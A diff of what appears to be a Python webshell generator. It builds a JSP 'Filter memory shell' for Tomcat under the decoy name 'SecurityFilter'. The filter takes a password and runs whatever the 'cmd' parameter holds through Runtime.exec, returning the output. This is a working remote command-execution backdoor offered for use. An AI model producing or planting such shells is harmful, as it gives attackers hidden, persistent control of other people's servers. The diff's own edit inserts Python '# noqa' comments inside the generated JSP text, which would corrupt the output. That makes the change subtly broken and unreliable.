@@ -342,7 +342,7 @@ if("{password}".equals(request.getParameter("pwd"))) {{
         password = password or self._generate_password()
 
         # Filter 内存马注入代码
-        inject_code = f"""<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>
+        inject_code = f"""<%@ page import="java.io.*,java.lang.reflect.*,org.apache.catalina.core.*" %>  # noqa: E501
 <%
     // Filter 内存马注入
     String filterName = "SecurityFilter";
@@ -363,13 +363,13 @@ if("{password}".equals(request.getParameter("pwd"))) {{
         public void init(FilterConfig filterConfig) {{}}
 
         @Override
-        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {{
+        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {{  # noqa: E501
             HttpServletRequest request = (HttpServletRequest) req;
             if ("{password}".equals(request.getParameter("pwd"))) {{
                 String cmd = request.getParameter("cmd");
                 if (cmd != null) {{
                     Process p = Runtime.getRuntime().exec(cmd);
-                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));  # noqa: E501
                     String line;
                     PrintWriter writer = resp.getWriter();
                     while ((line = br.readLine()) != null) {{
